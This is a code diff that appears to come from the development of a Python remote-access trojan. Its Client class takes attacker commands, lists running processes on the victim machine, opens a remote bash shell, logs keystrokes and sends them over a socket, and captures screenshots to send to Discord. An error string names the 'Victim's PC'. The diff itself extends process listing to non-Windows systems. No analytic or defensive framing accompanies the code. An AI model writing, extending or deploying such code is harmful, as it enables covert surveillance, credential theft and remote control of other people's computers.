@@ -54,12 +54,8 @@ class Client():
                     listener.join()
         # Get All Running Process
         if self.command=="get_running_process":
-            try:
-                ps=self.get_running_process().encode()
-            except:
-                self.client.send("wmi Isn't Installed In Victim's PC Or Victim Is Not Using Windows".encode())
-            else:
-                self.client.send(ps)
+            ps=self.get_running_process().encode()
+            self.client.send(ps)
         # Open Bash
         if self.command=="open_bash":
             while True:
@@ -68,13 +64,13 @@ class Client():
     @property
     def os_name(self) -> str:
         if sys.platform=="win32":
-            return "windows"
+            return "Windows"
         elif sys.platform=="darwin":
-            return "macos"
+            return "Mac OS"
         elif sys.platform=="linux":
-            return "linux"
+            return "Linux"
         else:
-            return "other"
+            return "Other"
     def send_screenshot_to_discord(self) -> None:
         ImageGrab.grab().save("screenshot.png")
         _temp_path=os.path.join(os.getcwd(),"screenshot.png")
@@ -82,12 +78,15 @@ class Client():
     def log_keys(self,key:Any) -> None:
         self.client.send(str(key).encode())
     def get_running_process(self) -> str:
-        import wmi
-        w=wmi.WMI()
-        ps=""
-        for i in w.Win32_Process():
-            ps+=f"{i.Name}\t\t{i.ProcessId}\n"
-        return ps
+        if sys.platform=="win32":
+            import wmi
+            w=wmi.WMI()
+            ps=""
+            for i in w.Win32_Process():
+                ps+=f"{i.Name}\t\t{i.ProcessId}\n"
+            return ps
+        else:
+            return subprocess.getoutput("ps")
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
         c=socket.socket()
